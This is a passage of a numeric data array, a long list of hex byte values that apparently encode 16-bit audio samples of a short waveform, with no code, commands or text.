0xFF, 0x7A, 0x00, 0x87, 0x01, 0x46, 0x02, 0xC1, 0x02, 0x42, 0x03, 0xAC, 0x03, 0xAA, 0x03, 0x1B, 0x03, 0x43, 0x02, 0x84, 0x01, 0xFB, 0x00, 0x2C, 0x00, 0x5D, 0xFF, 0xE5, 0xFE, 0xC3, 0xFE, 0xB6, 0xFE, 0x9D, 0xFE, 0x8E, 0xFE, 0xCE, 0xFE, 0x23, 0xFF, 0x58, 0xFF, 0x50, 0xFF, 0x31, 0xFF, 0x11, 0xFF, 0xEC, 0xFE, 0xCC, 0xFE, 0x86, 0xFE, 0x23, 0xFE, 0xFA, 0xFD, 0xE6, 0xFD, 0xED, 0xFD, 0x0F, 0xFE, 0x4F, 0xFE, 0x53, 0xFE, 0xA2, 0xFE, 0x28, 0xFF, 0x6F, 0xFF, 0x8E, 0xFF, 0xDA, 0xFF, 0x61, 0x00, 0x8C, 0x00, 0x93, 0x00, 0x84, 0x00, 0x92, 0x00, 0xC9, 0x00, 0x94, 0x00, 0x59, 0x00, 0x4B, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x5E, 0x00, 0x95, 0x00, 0x8F, 0x00, 0x90, 0x00, 0xC4, 0x00, 0xDC, 0x00, 0xA2, 0x00, 0x6F, 0x00, 0x5C, 0x00, 0x62, 0x00, 0x57, 0x00, 0x4D, 0x00, 0x60, 0x00, 0x97, 0x00, 0xB7, 0x00, 0xE5, 0x00, 0x52, 0x01, 0xB7, 0x01, 0x2B, 0x02, 0x93, 0x02, 0xC4, 0x02, 0xBA, 0x02, 0x1E, 0x03, 0xB4, 0x03, 0x01, 0x04, 0x2E, 0x04, 0x65, 0x04, 0x99, 0x04, 0xAC, 0x04, 0x75, 0x04, 0xFA, 0x03, 0x27, 0x03, 0xA7, 0x02, 0x30, 0x02, 0x26, 0x01, 0xEA, 0xFF, 0x2B, 0xFF, 0xCD, 0xFE, 0x55, 0xFE, 0xCF, 0xFD, 0x7F, 0xFD, 0xB3, 0xFD, 0xFD, 0xFD, 0x6E, 0xFE, 0x1E, 0xFF, 0xE2, 0xFF, 0x7E, 0x00, 0x38, 0x01, 0xF1, 0x01, 0x4C, 0x02, 0x69, 0x02, 0x53, 0x02, 0xC4, 0x01, 0x06, 0x01, 0x0B, 0x00, 0x2E, 0xFF, 0x90, 0xFE, 0xCE, 0xFD, 0x1B, 0xFD, 0xF0, 0xFC, 0x07, 0xFD, 0x1A, 0xFD, 0x75, 0xFD, 0x70, 0xFE, 0x79, 0xFF, 0x1C, 0x00, 0x92, 0x00, 0x33, 0x01, 0x69, 0x01, 0x16, 0x01, 0xE6, 0x00, 0xE5, 0x00, 0xED, 0x00, 0xDB, 0x00, 0xF9, 0x00, 0x22, 0x01, 0x34, 0x01, 0x4D, 0x01, 0x86, 0x01, 0x5C, 0x01, 0xF4, 0x00, 0x5D, 0x00, 0xD8, 0xFF, 0x49, 0xFF, 0x82, 0xFE, 0x91, 0xFD, 0xAB, 0xFC, 0xCD, 0xFB, 0x25, 0xFB, 0xB7, 0xFA, 0x8A, 0xFA, 0x97, 0xFA, 0xDB, 0xFA, 0x5A, 0xFB, 0xFD, 0xFB, 0xBD, 0xFC, 0x6A, 0xFD, 0x2B, 0xFE, 0xF3, 0xFE, 0xB0, 0xFF, 0x39, 0x00, 0xA4, 0x00, 0xE9, 0x00, 0xF5, 0x00, 0xF2, 0x00, 0xE5, 0x00, 0xC5, 0x00, 0x9A, 0x00, 0x53, 0x00, 0xFB, 0xFF, 0xCB, 0xFF, 0xBE, 0xFF, 0x96, 0xFF, 0x81, 0xFF, 0x92, 0xFF, 0xA4, 0xFF, 0xC7, 0xFF, 0x06, 0x00, 0x27, 0x00, 0x68, 0x00, 0xD3, 0x00, 0x44, 0x01, 0xB1, 0x01, 0x11, 0x02, 0x64, 0x02, 0xAD, 0x02, 0xE1, 0x02, 0x1F, 0x03, 0x99, 0x03, 0x1D, 0x04, 0x58, 0x04, 0x5F, 0x04, 0x6A, 0x04, 0x36, 0x04, 0xD1, 0x03, 0x47, 0x03, 0xC3, 0x02, 0x18, 0x02, 0x40, 0x01, 0x78, 0x00, 0xE2, 0xFF, 0x68, 0xFF, 0xD3, 0xFE, 0x77, 0xFE, 0x2F, 0xFE, 0xF6, 0xFD, 0xC7, 0xFD, 0xC4, 0xFD, 0xD8, 0xFD, 0x08, 0xFE, 0x18, 0xFE, 0x21, 0xFE, 0x41, 0xFE, 0x67, 0xFE, 0x8F, 0xFE, 0xAC, 0xFE, 0xC1, 0xFE, 0xF8, 0xFE, 0x29, 0xFF, 0x8F, 0xFF, 0x14, 0x00, 0x86, 0x00, 0xD0, 0x00, 0x2C, 0x01, 0xA3, 0x01, 0x10, 0x02, 0x6C, 0x02, 0xB9, 0x02, 0xD0, 0x02, 0xCC, 0x02, 0xD7, 0x02, 0xE2, 0x02, 0xB4, 0x02, 0x74, 0x02, 0x4D, 0x02, 0x18, 0x02, 0xE9, 0x01, 0xA9, 0x01, 0x75, 0x01, 0x57, 0x01, 0x0A, 0x01, 0xA0, 0x00, 0x35, 0x00, 0xCC, 0xFF, 0x61, 0xFF, 0x03, 0xFF, 0x8A, 0xFE, 0x38, 0xFE, 0xEB, 0xFD, 0xA1, 0xFD, 0x4E, 0xFD, 0xFE, 0xFC, 0xD6, 0xFC, 0xB7, 0xFC, 0xAD, 0xFC, 0x91, 0xFC, 0x88, 0xFC, 0x9E, 0xFC, 0xFE, 0xFC, 0x6F, 0xFD, 0xE5, 0xFD, 0x82, 0xFE, 0x38, 0xFF, 0xF1, 0xFF, 0x9B, 0x00, 0x4E, 0x01, 0xDB, 0x01, 0x56, 0x02, 0xB9, 0x02, 0xE7, 0x02, 0xF0, 0x02, 0x01, 0x03, 0x0E, 0x03, 0xE4, 0x02, 0xBA, 0x02, 0x9C, 0x02, 0x76, 0x02, 0x22, 0x02, 0xF7, 0x01, 0xF3, 0x01, 0x0A, 0x02, 0x27, 0x02, 0x42, 0x02, 0x42, 0x02, 0x47, 0x02, 0x4B, 0x02, 0x4A, 0x02, 0x3D, 0x02, 0x1F, 0x02, 0xFC, 0x01, 0xC6, 0x01, 0xA7, 0x01, 0x73, 0x01, 0x1E, 0x01, 0xBF, 0x00, 0x6F, 0x00, 0x09, 0x00, 0x91, 0xFF, 0x3B, 0xFF, 0xED, 0xFE, 0x66, 0xFE, 0xD3, 0xFD, 0x6B, 0xFD, 0x26, 0xFD, 0xBC, 0xFC, 0x51, 0xFC, 0xF1, 0xFB, 0xA8, 0xFB, 0x79, 0xFB, 0x7C, 0xFB, 0x94, 0xFB, 0x8A, 0xFB, 0xC0, 0xFB, 0x64, 0xFC, 0xE7, 0xFC, 0x00, 0xFD, 0x63, 0xFD, 0x25, 0xFE, 0xC2, 0xFE, 0x25, 0xFF, 0xB7, 0xFF, 0x4C, 0x00, 0xBB, 0x00, 0x02, 0x01, 0x67, 0x01, 0xC2, 0x01, 0xE1, 0x01, 0xF5, 0x01, 0x34, 0x02, 0x6A, 0x02, 0x97, 0x02, 0xB7, 0x02, 0xCD, 0x02, 0xAC, 0x02, 0x4C, 0x02, 0xF2, 0x01, 0x7E, 0x01, 0xD8, 0x00, 0x37, 0x00, 0xA7, 0xFF, 0x1D, 0xFF, 0x94, 0xFE, 0x3D, 0xFE, 0xEB, 0xFD, 0xDA, 0xFD, 0xF2, 0xFD, 0xE9, 0xFD, 0xF3, 0xFD, 0x1E, 0xFE, 0x7D, 0xFE, 0xC3, 0xFE, 0xF9, 0xFE, 0x4A, 0xFF, 0x8E, 0xFF, 0xCC, 0xFF, 0x01, 0x00, 0x54, 0x00, 0xCF, 0x00, 0x4A, 0x01, 0x91, 0x01, 0xD0, 0x01, 0x0B, 0x02, 0x3F, 0x02, 0x3C, 0x02, 0x0A, 0x02, 0xB5, 0x01, 0x67, 0x01, 0xEE, 0x00, 0x33, 0x00, 0x66, 0xFF, 0xBF, 0xFE, 0x51, 0xFE, 0x01, 0xFE, 0xD7, 0xFD, 0xAE, 0xFD, 0x9C, 0xFD, 0x97, 0xFD, 0xB8, 0xFD, 0x14, 0xFE, 0x5E, 0xFE, 0x7D, 0xFE, 0xC0, 0xFE, 0x4B, 0xFF, 0xA2, 0xFF, 0x9B, 0xFF, 0xFF, 0xFF, 0xC0, 0x00, 0x25, 0x01, 0x29, 0x01, 0x2E, 0x01, 0x65, 0x01, 0x89, 0x01, 0x6C, 0x01, 0x67, 0x01, 0x7F, 0x01, 0x54, 0x01, 0x0A, 0x01, 0xAD, 0x00, 0x62, 0x00, 0x09, 0x00, 0xBE, 0xFF, 0x7C, 0xFF, 0x02, 0xFF, 0x77, 0xFE, 0xE9, 0xFD, 0x5E, 0xFD, 0x29, 0xFD, 0x5C, 0xFD, 0x70, 0xFD, 0x7E, 0xFD, 0xC2, 0xFD, 0x19, 0xFE, 0x5E, 0xFE, 0xAC, 0xFE, 0xD5, 0xFE, 0x1C, 0xFF, 0x4E, 0xFF, 0x77, 0xFF, 0x7F, 0xFF, 0x87, 0xFF, 0xAD, 0xFF, 0xBE, 0xFF, 0xC0, 0xFF, 0xC7, 0xFF, 0xEE, 0xFF, 0x12, 0x00, 0x3B, 0x00, 0x93, 0x00, 0xE3, 0x00, 0x1C, 0x01, 0x46, 0x01, 0x4F, 0x01, 0x6E, 0x01, 0x7D, 0x01, 0x78, 0x01, 0x6C, 0x01, 0x3D, 0x01, 0xD5, 0x00, 0x48, 0x00, 0x05, 0x00, 0xCC, 0xFF, 0x93, 0xFF, 0x61, 0xFF, 0x5B, 0xFF, 0x67, 0xFF, 0x80, 0xFF, 0xBA, 0xFF, 0x02, 0x00, 0x4F, 0x00, 0x80, 0x00, 0x99, 0x00, 0xC0, 0x00, 0x9E, 0x00, 0x73, 0x00, 0x36, 0x00, 0xDC, 0xFF, 0x73, 0xFF, 0x05, 0xFF, 0x95, 0xFE, 0x20, 0xFE, 0xBE, 0xFD, 0x94, 0xFD, 0x95, 0xFD, 0x97, 0xFD, 0xCF, 0xFD, 0x31, 0xFE, 0xB1, 0xFE, 0x42, 0xFF, 0xA4, 0xFF, 0xF3, 0xFF, 0x2B, 0x00, 0x53, 0x00, 0x60, 0x00, 0x71, 0x00, 0x67, 0x00, 0x3B, 0x00, 0xFF, 0xFF, 0xDB, 0xFF, 0xDC, 0xFF, 0xC9, 0xFF, 0xA1, 0xFF, 0x8B, 0xFF, 0xCD, 0xFF, 0x21, 0x00, 0x94, 0x00, 0xCF, 0x00, 0xF9, 0x00, 0x8A, 0x01, 0x30, 0x02, 0x89, 0x02, 0xB1, 0x02, 0xD8, 0x02, 0xDC, 0x02, 0x09, 0x03, 0x4A, 0x03, 0x50, 0x03, 0x1E, 0x03, 0xBD, 0x02, 0x7B, 0x02, 0x51, 0x02, 0x2B, 0x02, 0xE1, 0x01, 0x6E, 0x01, 0xE9, 0x00, 0x59, 0x00, 0xB6, 0xFF, 0x05, 0xFF, 0x4F, 0xFE, 0xCD, 0xFD, 0x37, 0xFD, 0xC7, 0xFC, 0x8C, 0xFC, 0x5C, 0xFC, 0x26, 0xFC, 0xFF, 0xFB, 0x17, 0xFC, 0x4E, 0xFC, 0x5E, 0xFC, 0xA4, 0xFC, 0x19, 0xFD, 0x7E, 0xFD, 0xBC, 0xFD, 0x01, 0xFE, 0x55, 0xFE, 0x97, 0xFE, 0xA6, 0xFE, 0xB0, 0xFE, 0xCA, 0xFE, 0xE5, 0xFE, 0x19, 0xFF, 0x39, 0xFF, 0x5D, 0xFF, 0x70, 0xFF, 0x95, 0xFF, 0xF9, 0xFF, 0x46, 0x00, 0x85, 0x00, 0xEC, 0x00, 0x46, 0x01, 0x93, 0x01, 0xF2, 0x01, 0x49, 0x02, 0xB0, 0x02, 0x0F, 0x03, 0x5E, 0x03, 0x86, 0x03, 0xC4, 0x03, 0xD8, 0x03, 0xC4, 0x03, 0x84, 0x03, 0x4C, 0x03, 0x09, 0x03, 0xB7, 0x02, 0x3F, 0x02, 0xE2, 0x01, 0x8A, 0x01, 0x29, 0x01, 0xBA, 0x00, 0x4F, 0x00, 0x15, 0x00, 0xCC, 0xFF, 0x6B, 0xFF, 0x2F, 0xFF, 0xF9, 0xFE, 0xC7, 0xFE, 0x8F, 0xFE, 0x72, 0xFE, 0x65, 0xFE, 0x4F, 0xFE, 0x46, 0xFE, 0x3F, 0xFE, 0x23, 0xFE, 0x31, 0xFE, 0x15, 0xFE, 0x02, 0xFE, 0xF4, 0xFD, 0xF8, 0xFD, 0xE9, 0xFD, 0xE4, 0xFD, 0xE1, 0xFD, 0x02, 0xFE, 0x03, 0xFE, 0x2B, 0xFE, 0x87, 0xFE, 0xF3, 0xFE, 0x53, 0xFF, 0xB1, 0xFF, 0x2F, 0x00, 0xC3, 0x00, 0x67, 0x01, 0x10, 0x02, 0xC4, 0x02, 0x6A, 0x03, 0x86, 0x03, 0xA2, 0x03, 0xF7, 0x03, 0xF1, 0x03, 0xB9, 0x03, 0x82, 0x03, 0x5F, 0x03, 0x2A, 0x03, 0xD1, 0x02, 0x79, 0x02, 0x35, 0x02, 0xD9, 0x01, 0x6A, 0x01, 0xF8, 0x00, 0x82, 0x00, 0xF9, 0xFF, 0x6F, 0xFF, 0x0C, 0xFF, 0xC7, 0xFE, 0x6D, 0xFE, 0x3A, 0xFE, 0x4D, 0xFE, 0x61, 0xFE, 0x75, 0xFE, 0x9A, 0xFE, 0xE2, 0xFE, 0x68, 0xFF, 0xDB, 0xFF, 0x20, 0x00, 0x43, 0x00, 0x70, 0x00, 0x91, 0x00, 0xA8, 0x00, 0xB3, 0x00, 0x94, 0x00, 0x7A, 0x00, 0x58, 0x00, 0x2B, 0x00, 0x06, 0x00, 0xEF, 0xFF, 0x09, 0x00, 0x15, 0x00, 0x2C, 0x00, 0x32, 0x00, 0x4D, 0x00, 0x49, 0x00, 0x3C, 0x00, 0x2E, 0x00, 0x2C, 0x00, 0x13, 0x00, 0xE6, 0xFF, 0xAA, 0xFF, 0x84, 0xFF, 0x68, 0xFF, 0x2D, 0xFF, 0xF6, 0xFE, 0xD2, 0xFE, 0xC2, 0xFE, 0xBE, 0xFE, 0xC6, 0xFE, 0xE9, 0xFE, 0xFF, 0xFE, 0x09, 0xFF, 0x19, 0xFF, 0x2C, 0xFF, 0x42, 0xFF, 0x61, 0xFF, 0x98, 0xFF, 0xE8, 0xFF, 0x15, 0x00, 0x32, 0x00, 0x65, 0x00, 0xB4, 0x00, 0xFF, 0x00, 0x2D, 0x01, 0x76, 0x01, 0xB3, 0x01, 0xBE, 0x01, 0xB3, 0x01, 0x9B, 0x01, 0x9D, 0x01, 0x7C, 0x01, 0x40, 0x01, 0xFB, 0x00, 0x9D, 0x00, 0x51, 0x00, 0x0C, 0x00, 0xD1, 0xFF, 0x9E, 0xFF, 0x4E, 0xFF, 0xFC, 0xFE, 0xE3, 0xFE, 0xBF, 0xFE, 0xA7, 0xFE, 0x73, 0xFE, 0x6F, 0xFE, 0x75, 0xFE, 0x72, 0xFE, 0x7B, 0xFE, 0xAE, 0xFE, 0xBE, 0xFE, 0xE7, 0xFE, 0x1C, 0xFF, 0x57, 0xFF, 0x9E, 0xFF, 0xEB, 0xFF, 0x41, 0x00, 0xA6, 0x00, 0xE9, 0x00, 0x48, 0x01, 0xA7, 0x01, 0x01, 0x02, 0x5F, 0x02, 0xAE, 0x02, 0x09, 0x03, 0x45, 0x03, 0x69, 0x03, 0x96, 0x03, 0xB7, 0x03, 0x99, 0x03, 0x5B, 0x03, 0x39, 0x03, 0x17, 0x03, 0xBB, 0x02, 0x5D, 0x02, 0xCF, 0x01, 0x57, 0x01, 0xEC, 0x00, 0x77, 0x00, 0x01, 0x00, 0x87, 0xFF, 0x18, 0xFF, 0xAB, 0xFE, 0x50, 0xFE, 0xFD, 0xFD, 0xAD, 0xFD, 0x7F, 0xFD, 0x5C, 0xFD, 0x10, 0xFD, 0xE9, 0xFC, 0xFE, 0xFC, 0x11, 0xFD, 0xE5, 0xFC, 0xE7, 0xFC, 0x1B, 0xFD, 0x50, 0xFD, 0x8C, 0xFD, 0xF4, 0xFD, 0x5E, 0xFE, 0xBC, 0xFE, 0x1A, 0xFF, 0x6C, 0xFF, 0xC4, 0xFF, 0x19, 0x00, 0x58, 0x00, 0x77, 0x00, 0x8E, 0x00, 0x9E, 0x00, 0xA0, 0x00, 0xB8, 0x00, 0xE2, 0x00, 0x11, 0x01, 0x47, 0x01, 0x8D, 0x01, 0xDF, 0x01, 0x28, 0x02, 0x5D, 0x02, 0x9B, 0x02, 0xCE, 0x02, 0xEE, 0x02, 0xEB, 0x02, 0xEC, 0x02, 0xDF, 0x02, 0xBF, 0x02, 0x86, 0x02, 0x4D, 0x02, 0x19, 0x02, 0xF8, 0x01, 0xCD, 0x01, 0x95, 0x01, 0x45, 0x01, 0x0D, 0x01, 0xDA, 0x00, 0x9E, 0x00, 0x4D, 0x00, 0xFF, 0xFF, 0xC8, 0xFF, 0x82, 0xFF, 0x47, 0xFF, 0x1B, 0xFF, 0xFC, 0xFE, 0xFE, 0xFE, 0xF2, 0xFE, 0xE6, 0xFE, 0x06, 0xFF, 0x3F, 0xFF, 0x66, 0xFF, 0x83, 0xFF, 0x99, 0xFF, 0xC6, 0xFF, 0xF0, 0xFF, 0xFB, 0xFF, 0xEA, 0xFF, 0xCE, 0xFF, 0xBC, 0xFF, 0x93, 0xFF, 0x50, 0xFF, 0x3C, 0xFF, 0x1C, 0xFF, 0x05, 0xFF, 0xE7, 0xFE, 0xF1, 0xFE, 0xE4, 0xFE, 0xEB, 0xFE, 0xF7, 0xFE, 0x01, 0xFF, 0x0F, 0xFF, 0x1C, 0xFF, 0x25, 0xFF, 0x45, 0xFF, 0x60, 0xFF, 0xA4, 0xFF, 0xEE, 0xFF, 0x1D, 0x00, 0x70, 0x00, 0xBA, 0x00, 0xDC, 0x00, 0xC8, 0x00, 0xD6, 0x00, 0xE1, 0x00, 0xC8, 0x00, 0x90, 0x00, 0x5E, 0x00, 0x4D, 0x00, 0x0C, 0x00, 0xC6, 0xFF, 0x9D, 0xFF, 0x7B, 0xFF, 0x55, 0xFF, 0x37, 0xFF, 0x24, 0xFF, 0x1C, 0xFF, 0x24, 0xFF, 0x50, 0xFF, 0x8F, 0xFF, 0xFE, 0xFF, 0x49, 0x00, 0xA0, 0x00, 0xE6, 0x00, 0xFE, 0x00, 0x0E, 0x01, 0x11, 0x01, 0x21, 0x01, 0x58, 0x01, 0x6C, 0x01, 0x55, 0x01, 0x23, 0x01, 0xF5, 0x00, 0xE9, 0x00, 0xDB, 0x00, 0xB5, 0x00, 0x93, 0x00, 0x92, 0x00, 0x96, 0x00, 0x95, 0x00, 0x88, 0x00, 0x60, 0x00, 0x71, 0x00, 0x5F, 0x00, 0x51, 0x00, 0x64, 0x00, 0x8C, 0x00, 0x87, 0x00, 0x73, 0x00, 0x65, 0x00, 0x5C, 0x00, 0x59, 0x00, 0x37, 0x00, 0x2D, 0x00, 0x10, 0x00, 0xFC, 0xFF, 0xF3, 0xFF, 0xF1, 0xFF, 0xFD, 0xFF, 0x07, 0x00, 0x12, 0x00, 0x2F, 0x00, 0x3A, 0x00, 0x43, 0x00, 0x54, 0x00, 0x4A, 0x00, 0x0C, 0x00, 0xE3, 0xFF, 0xD6, 0xFF, 0xCC, 0xFF, 0xB2, 0xFF, 0xAD, 0xFF, 0x97, 0xFF, 0x59, 0xFF, 0x29, 0xFF, 0xE4, 0xFE, 0xC4, 0xFE, 0xCA, 0xFE, 0xE4, 0xFE, 0xEF, 0xFE, 0xF4, 0xFE, 0x24, 0xFF, 0x7D, 0xFF, 0x92, 0xFF, 0xB5, 0xFF, 0x05, 0x00, 0x58, 0x00, 0x9D, 0x00, 0xD7, 0x00, 0x31, 0x01, 0x59, 0x01, 0x77, 0x01, 0xA5, 0x01, 0xC7, 0x01, 0xC2, 0x01, 0x8C, 0x01, 0x29, 0x01, 0xC3, 0x00, 0x60, 0x00, 0x21, 0x00, 0xDE, 0xFF, 0xA9, 0xFF, 0x81, 0xFF, 0x31, 0xFF, 0x0B, 0xFF, 0xFD, 0xFE, 0x17, 0xFF, 0x28, 0xFF, 0x47, 0xFF, 0x6E, 0xFF, 0xB5, 0xFF, 0xF3, 0xFF, 0x23, 0x00, 0x73, 0x00, 0xCE, 0x00, 0xDD, 0x00, 0xDF, 0x00, 0xF5, 0x00, 0x1B, 0x01, 0xF4, 0x00, 0xE8, 0x00, 0xD2, 0x00, 0x97, 0x00, 0x45, 0x00, 0xFB, 0xFF, 0xD0, 0xFF, 0x73, 0xFF, 0x26, 0xFF, 0xFA, 0xFE, 0xE2, 0xFE, 0xC7, 0xFE, 0x7E, 0xFE, 0x5E, 0xFE, 0x56, 0xFE, 0x7D, 0xFE, 0x98, 0xFE, 0xC1, 0xFE, 0xDF, 0xFE, 0x08, 0xFF, 0x54, 0xFF, 0x89, 0xFF, 0xBA, 0xFF, 0xE9, 0xFF, 0x20, 0x00, 0x35, 0x00, 0x4E, 0x00, 0x78, 0x00, 0x86, 0x00, 0x82, 0x00, 0x94, 0x00, 0x97, 0x00, 0x86, 0x00, 0x8E, 0x00, 0x84, 0x00, 0xC0, 0x00, 0xE8, 0x00, 0x09, 0x01, 0x33, 0x01, 0x59, 0x01, 0xA0, 0x01, 0xAE, 0x01, 0xB4, 0x01, 0xCD, 0x01, 0xC6, 0x01, 0xA0, 0x01, 0x6D, 0x01, 0x44, 0x01, 0x0F, 0x01, 0xBC, 0x00, 0x5C, 0x00, 0x0F, 0x00, 0x06, 0x00, 0xB9, 0xFF, 0x4D, 0xFF, 0x0E, 0xFF, 0xEC, 0xFE, 0xC2, 0xFE, 0xAD, 0xFE, 0xA1, 0xFE, 0x98, 0xFE, 0x65, 0xFE, 0x57, 0xFE, 0x8A, 0xFE, 0x91, 0xFE, 0x84, 0xFE, 0x9C, 0xFE, 0xCA, 0xFE, 0xF7, 0xFE, 0x10, 0xFF, 0x1D, 0xFF, 0x54, 0xFF, 0x89, 0xFF, 0xC1, 0xFF, 0xE4, 0xFF, 0x12, 0x00, 0x65, 0x00, 0xA6, 0x00, 0xE7, 0x00, 0x0B, 0x01, 0x23, 0x01, 0x75, 0x01, 0x9A, 0x01, 0x9E, 0x01, 0x84, 0x01, 0xA2, 0x01, 0xC5, 0x01, 0xA4, 0x01, 0x91, 0x01, 0x64, 0x01, 0x3E, 0x01, 0x11, 0x01, 0xF9, 0x00, 0xD1, 0x00, 0x71, 0x00, 0x2F, 0x00, 0xF6, 0xFF, 0xBF, 0xFF, 0x72, 0xFF, 0x31, 0xFF, 0x18, 0xFF, 0xF1, 0xFE, 0xC8, 0xFE, 0xBE, 0xFE, 0xBD, 0xFE, 0xC9, 0xFE, 0xD9, 0xFE, 0xEE, 0xFE, 0x00, 0xFF, 0x1D, 0xFF, 0x43, 0xFF, 0x5B, 0xFF, 0x66, 0xFF, 0x93, 0xFF, 0x90, 0xFF, 0x94, 0xFF, 0xA4, 0xFF, 0xBB, 0xFF, 0xC9, 0xFF, 0xB5, 0xFF, 0xAA, 0xFF, 0x8C, 0xFF, 0x7D, 0xFF, 0x63, 0xFF, 0x6D, 0xFF, 0x69, 0xFF, 0x63, 0xFF, 0x8C, 0xFF, 0xB2, 0xFF, 0xF6, 0xFF, 0x43, 0x00, 0x73, 0x00, 0x8B, 0x00, 0x9F, 0x00, 0xCA, 0x00, 0xDE, 0x00, 0xD0, 0x00, 0xB4, 0x00, 0xA7, 0x00, 0x9D, 0x00, 0x95, 0x00, 0x9C, 0x00, 0x95, 0x00, 0x86, 0x00, 0x71, 0x00, 0x46, 0x00, 0x21, 0x00, 0x1A, 0x00, 0x2E, 0x00, 0x34, 0x00, 0x1C, 0x00, 0x10, 0x00, 0x16, 0x00, 0x13, 0x00, 0x0C, 0x00, 0x16, 0x00, 0x58, 0x00, 0x9E, 0x00, 0xE1, 0x00, 0x13, 0x01, 0x46, 0x01, 0x7A, 0x01, 0xA5, 0x01, 0xAF, 0x01, 0xA6, 0x01, 0x67, 0x01, 0x1C, 0x01, 0xE4, 0x00, 0x9B, 0x00, 0x5D, 0x00, 0x0A, 0x00, 0xC4, 0xFF, 0x70, 0xFF, 0x2B, 0xFF, 0x00, 0xFF, 0xCA, 0xFE, 0x7C, 0xFE, 0x30, 0xFE, 0xF2, 0xFD, 0xE3, 0xFD, 0xDA, 0xFD, 0xD8, 0xFD, 0xE0, 0xFD, 0xF2, 0xFD, 0x30, 0xFE, 0x78, 0xFE, 0xAC, 0xFE, 0xC1, 0xFE, 0xF1, 0xFE, 0x64, 0xFF, 0xC6, 0xFF, 0x33, 0x00, 0x7D, 0x00, 0xCE, 0x00, 0x18, 0x01, 0x44, 0x01, 0x8A, 0x01, 0xC0, 0x01, 0xDC, 0x01, 0xF9, 0x01, 0x02, 0x02, 0x02, 0x02, 0xF5, 0x01, 0xF6, 0x01, 0xE9, 0x01, 0xE9, 0x01, 0xC8, 0x01, 0xA6, 0x01, 0x8E, 0x01, 0x81, 0x01, 0x4A, 0x01, 0xFF, 0x00, 0xC6, 0x00, 0x85, 0x00, 0x5B, 0x00, 0x07, 0x00, 0xC3, 0xFF, 0x94, 0xFF, 0x51, 0xFF, 0xCA, 0xFE, 0x5F, 0xFE, 0x25, 0xFE, 0xDF, 0xFD, 0xA0, 0xFD, 0x8F, 0xFD, 0x90, 0xFD, 0x9A, 0xFD, 0xB4, 0xFD, 0xFB, 0xFD, 0x1D, 0xFE, 0x2E, 0xFE, 0x74, 0xFE, 0xE1, 0xFE, 0x2B, 0xFF, 0x59, 0xFF, 0x89, 0xFF, 0xC9, 0xFF, 0x43, 0x00, 0x79, 0x00, 0x6C, 0x00, 0x71, 0x00, 0x94, 0x00, 0xBB, 0x00, 0xB0, 0x00, 0xBD, 0x00, 0xF0, 0x00, 0x4E, 0x01, 0x94, 0x01, 0xCD, 0x01, 0x12, 0x02, 0x41, 0x02, 0x44, 0x02, 0x12, 0x02, 0x2A, 0x02, 0x43, 0x02, 0x01, 0x02, 0x98, 0x01, 0x2E, 0x01, 0xF1, 0x00, 0xB0, 0x00, 0x5A, 0x00, 0xD5, 0xFF, 0x54, 0xFF, 0xDF, 0xFE, 0x74, 0xFE, 0x26, 0xFE, 0xC4, 0xFD, 0x88, 0xFD, 0x4F, 0xFD, 0x48, 0xFD, 0x51, 0xFD, 0x6F, 0xFD, 0xAE, 0xFD, 0xE0, 0xFD, 0x44, 0xFE, 0xC4, 0xFE, 0x0B, 0xFF, 0x31, 0xFF, 0x6B, 0xFF, 0xB4, 0xFF, 0xDF, 0xFF, 0xF6, 0xFF, 0xF7, 0xFF, 0x02, 0x00, 0xE9, 0xFF, 0xDC, 0xFF, 0xA0, 0xFF, 0x5F, 0xFF, 0x3F, 0xFF, 0x26, 0xFF, 0x08, 0xFF, 0xF9, 0xFE, 0xDA, 0xFE, 0xAA, 0xFE, 0x78, 0xFE, 0x9D, 0xFE, 0xD1, 0xFE, 0x04, 0xFF, 0x2A, 0xFF, 0x80, 0xFF, 0xD7, 0xFF, 0x10, 0x00, 0x57, 0x00, 0xB0, 0x00, 0xEC, 0x00, 0x07, 0x01, 0x19, 0x01, 0x60, 0x01, 0x82, 0x01, 0x8B, 0x01, 0x77, 0x01, 0x76, 0x01, 0x7D, 0x01, 0x4D, 0x01, 0x21, 0x01, 0xFB, 0x00, 0xCA, 0x00, 0x9B, 0x00, 0x84, 0x00, 0x69, 0x00, 0x37, 0x00, 0x20, 0x00, 0x0B, 0x00, 0x0D, 0x00, 0xEC, 0xFF, 0xBF, 0xFF, 0xAA, 0xFF, 0xA8, 0xFF, 0x9A, 0xFF, 0x8A, 0xFF, 0x7B, 0xFF, 0x7B, 0xFF, 0x6F, 0xFF, 0x6E, 0xFF, 0x54, 0xFF, 0x3D, 0xFF, 0x1D, 0xFF, 0xFB, 0xFE, 0xE4, 0xFE, 0xC4, 0xFE, 0xD5, 0xFE, 0xDA, 0xFE, 0xB9, 0xFE, 0x9D, 0xFE, 0x7D, 0xFE, 0x95, 0xFE, 0xA7, 0xFE, 0xCB, 0xFE, 0x09, 0xFF, 0x1E, 0xFF, 0x4C, 0xFF, 0x95, 0xFF, 0xBE, 0xFF, 0xDB, 0xFF, 0xF6, 0xFF, 0x1B, 0x00, 0xFE, 0xFF, 0x07, 0x00, 0x26, 0x00, 0x29, 0x00, 0x21, 0x00, 0x29, 0x00, 0x61, 0x00, 0x71, 0x00, 0x69, 0x00, 0x9D, 0x00, 0xEE, 0x00, 0x13, 0x01, 0x04, 0x01, 0xF8, 0x00, 0x04, 0x01, 0x1F, 0x01, 0x2B, 0x01, 0x24, 0x01, 0xFF, 0x00, 0x06, 0x01, 0x05, 0x01, 0x08, 0x01, 0x0B, 0x01, 0x08, 0x01, 0xF7, 0x00, 0xDF, 0x00, 0xD3, 0x00, 0xBF, 0x00, 0x8E, 0x00, 0x5E, 0x00, 0x04, 0x00, 0x77, 0xFF, 0x0A, 0xFF, 0xBA, 0xFE, 0x55, 0xFE, 0x17, 0xFE, 0xC4, 0xFD, 0x5A, 0xFD, 0x5A, 0xFD, 0xA5, 0xFD, 0xDF, 0xFD, 0xFE, 0xFD, 0x3E, 0xFE, 0x95, 0xFE, 0x09, 0xFF, 0x99, 0xFF, 0xF5, 0xFF, 0x65, 0x00, 0x27, 0x01, 0xF0, 0x01, 0x1F, 0x02, 0x61, 0x02, 0x12, 0x03, 0x48, 0x01, 0xD9, 0xFD, 0x31, 0xFD, 0x31, 0xFF, 0xAE, 0xFF, 0xB8, 0xFF, 0xD4, 0x00, 0x0B, 0x02, 0x20, 0x04, 0xF8, 0x06, 0x98, 0x08, 0x1E, 0x06, 0x3E, 0x03, 0xB3, 0xFF, 0xC8, 0xFA, 